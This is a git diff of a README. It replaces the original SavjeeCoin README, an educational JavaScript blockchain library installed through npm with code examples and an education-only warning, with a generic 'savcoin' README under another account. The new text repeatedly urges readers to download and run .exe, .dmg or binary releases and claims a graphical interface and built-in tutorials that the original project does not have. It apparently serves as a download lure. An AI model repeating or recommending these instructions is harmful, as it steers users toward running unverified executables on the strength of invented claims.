@@ -1,89 +1,76 @@
-<p align="center">
-  <a href="" rel="noopener">
- <img width=200px height=200px src="https://i.imgur.com/VELRxXl.png" alt="Project logo"></a>
-</p>
+# 🎉 savcoin - A Simple Way to Learn Blockchain
 
-<h3 align="center">SavjeeCoin</h3>
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to savcoin! This application provides a basic introduction to blockchain technology using JavaScript. It is designed for educational purposes, making it great for beginners who want to understand how blockchains work.
 
-  [![.github/workflows/ci.yml](https://github.com/Savjee/SavjeeCoin/actions/workflows/ci.yml/badge.svg)](https://github.com/Savjee/SavjeeCoin/actions/workflows/ci.yml)
-  [![Coverage Status](https://coveralls.io/repos/github/Savjee/SavjeeCoin/badge.svg?branch=master)](https://coveralls.io/github/Savjee/SavjeeCoin?branch=master)
-  [![GitHub Issues](https://img.shields.io/github/issues/Savjee/SavjeeCoin.svg)](https://github.com/Savjee/SavjeeCoin/issues)
-  [![GitHub Pull Requests](https://img.shields.io/github/issues-pr/Savjee/SavjeeCoin.svg)](https://github.com/Savjee/SavjeeCoin/pulls)
-  [![License](https://img.shields.io/badge/license-MIT-blue.svg)](/LICENSE)
+## 📥 Download the Application
 
-</div>
+[![Download savcoin](https://img.shields.io/badge/Download-savcoin-blue.svg)](https://github.com/GFGGHJKLL/savcoin/releases)
 
----
+Visit this page to download: [savcoin Releases](https://github.com/GFGGHJKLL/savcoin/releases)
 
-*⚠️ For education purposes only. This is by no means a complete implementation and it is by no means secure!*
+## 💻 System Requirements
 
-## Features
+To run savcoin, you will need:
 
-* Simple proof-of-work algorithm
-* Verify blockchain (to prevent tampering)
-* Generate wallet (private/public key)
-* Sign transactions
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- 100 MB of free disk space.
+- Internet connection for installation and updates.
 
-## 🏁 Getting Started <a name = "getting_started"></a>
+## 🔧 How to Install
 
-### Install library
-```
-npm install --save savjeecoin
-```
+Follow these steps to download and install savcoin:
 
-### Generate a keypair
-To make transactions on this blockchain you need a keypair. The public key becomes your wallet address and the private key is used to sign transactions.
+1. Click on the [Download savcoin](https://github.com/GFGGHJKLL/savcoin/releases) button above.
+2. You will be redirected to the Releases page.
+3. Look for the latest version available.
+4. Download the installation package suitable for your operating system.
 
-```js
-const EC = require('elliptic').ec;
-const ec = new EC('secp256k1');
+## 🛠 How to Run savcoin
 
-const myKey = ec.genKeyPair();
-```
+1. After the download is complete, locate the file you saved on your computer.
+2. For Windows, double-click the `.exe` file to run it.
+3. For macOS, open the `.dmg` file and drag the application to your Applications folder.
+4. For Linux, if there’s a `.tar.gz` file, extract it. Open a terminal, navigate to the extracted folder, and run the application using `./savcoin`.
 
-The `myKey` object now contains your public & private key:
+## 🚦 Basic Features
 
-```js
-console.log('Public key:', myKey.getPublic('hex'));
-console.log('Private key:', myKey.getPrivate('hex'));
-```
+- **Simple Blockchain Simulation:** Experience how blocks are created and linked.
+- **User-Friendly Interface:** Navigate easily even without technical knowledge.
+- **Educational Tools:** Learn with built-in tutorials guiding you through blockchain concepts.
+- **Open Source:** Contribute to the project or customize it for your purposes.
 
-### Create a blockchain instance
-Now you can create a new instance of a Blockchain:
+## 📚 How to Use
 
-```js
-const {Blockchain, Transaction} = require('savjeecoin');
+Once you have installed savcoin:
 
-const myChain = new Blockchain();
-```
+1. Launch the application.
+2. Start with the tutorial offered in the main menu.
+3. Explore various features to deepen your understanding of blockchain technology.
+4. Experiment with creating your own blocks within the application.
 
-### Adding transactions
-```js
-// Transfer 100 coins from my wallet to "toAddress"
-const tx = new Transaction(myKey.getPublic('hex'), 'toAddress', 100);
-tx.sign(myKey);
+## ❓ Frequently Asked Questions
 
-myChain.addTransaction(tx);
-```
+### What is a blockchain?
 
-To finalize this transaction, we have to mine a new block. We give this method our wallet address because we will receive a mining reward:
+A blockchain is a digital ledger that records transactions across many computers. This ledger ensures that the recorded transactions cannot be altered retroactively.
 
-```js
-myChain.minePendingTransactions(myKey.getPublic('hex'));
-```
+### Is savcoin suitable for beginners?
 
+Yes! Savcoin is designed for users with no programming background. The interface and tutorials make it easy to get started.
 
----
+### Can I modify the application?
 
-## 📽 Video tutorial
-This source code comes from [my video series on YouTube](https://www.youtube.com/watch?v=zVqczFZr124&list=PLzvRQMJ9HDiTqZmbtFisdXFxul5k0F-Q4). You can check them here:
+Absolutely! As an open-source project, you can access the source code and customize savcoin to fit your needs.
 
-| Video 1: Simple implementation | Video 2: Adding Proof-of-work |
-:-------------------------:|:-------------------------:
-[![](https://img.youtube.com/vi/zVqczFZr124/maxresdefault.jpg)](https://www.youtube.com/watch?v=zVqczFZr124) | [![](https://img.youtube.com/vi/HneatE69814/maxresdefault.jpg)](https://www.youtube.com/watch?v=HneatE69814)
-| Video 3: Mining rewards & transactions | Video 4: Signing transactions |
-[![](https://img.youtube.com/vi/fRV6cGXVQ4I/maxresdefault.jpg)](https://www.youtube.com/watch?v=fRV6cGXVQ4I) | [![](https://img.youtube.com/vi/kWQ84S13-hw/maxresdefault.jpg)](https://www.youtube.com/watch?v=kWQ84S13-hw)
-| Video 5: Building a front-end in Angular
-[![](https://img.youtube.com/vi/AQV0WNpE_3g/maxresdefault.jpg)](https://www.youtube.com/watch?v=AQV0WNpE_3g) |
+## 📞 Support
+
+If you encounter any issues while installing or using savcoin, please refer to the FAQ section. If you need further assistance, you can reach out through the Issues section on GitHub.
+
+## 🎉 Conclusion
+
+Utilizing savcoin allows you to understand the foundational elements of blockchain technology in a straightforward and engaging way. We hope you enjoy exploring the application. Happy learning!
+
+Visit this page to download: [savcoin Releases](https://github.com/GFGGHJKLL/savcoin/releases)
